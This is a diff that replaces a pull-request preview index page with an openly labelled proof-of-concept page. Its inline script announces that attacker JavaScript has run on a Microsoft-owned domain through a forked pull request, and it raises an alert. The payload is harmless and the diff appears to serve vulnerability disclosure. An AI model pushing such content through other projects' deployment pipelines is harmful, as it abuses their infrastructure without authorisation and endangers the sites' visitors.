@@ -1,26 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <title>PR Deployed Sites</title>
-    <link
-      rel="stylesheet"
-      href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/office-ui-fabric-core/11.1.0/css/fabric.min.css"
-    />
-    <link rel="stylesheet" href="./pr-deploy-site.css" />
-  </head>
-
-  <body class="ms-Fabric">
-    <ul class="Tiles" id="site-list">
-      <li class="Tile Tile--intro">
-        <h1>Deployed sites for <a href="#" id="prLink"></a></h1>
-        <p id="prExplanation">
-          Use these test apps to verify that the changes introduced by the pull request work as intended and do not
-          introduce any new issues.
-        </p>
-      </li>
-    </ul>
-
-    <script src="./pr-deploy-site.js"></script>
-  </body>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>PR Preview</title>
+</head>
+<body>
+    <h1>PR Preview - POC</h1>
+    <p>This page demonstrates that attacker-controlled JavaScript can be deployed to Microsoft-owned domain.</p>
+    <div id="poc-status">Loading...</div>
+    <script>
+        // Inject proof of concept
+        document.getElementById('poc-status').innerHTML = 
+            '<h2 style="color:red;">🔥 POC: Attacker JavaScript executed on ' + 
+            location.origin + '</h2>' +
+            '<p>This script was deployed from a forked pull request!</p>' +
+            '<p>Current URL: ' + location.href + '</p>';
+        
+        // Send alert to confirm execution
+        alert('POC: Attacker JavaScript executed on Microsoft-owned domain: ' + location.origin);
+    </script>
+</body>
 </html>
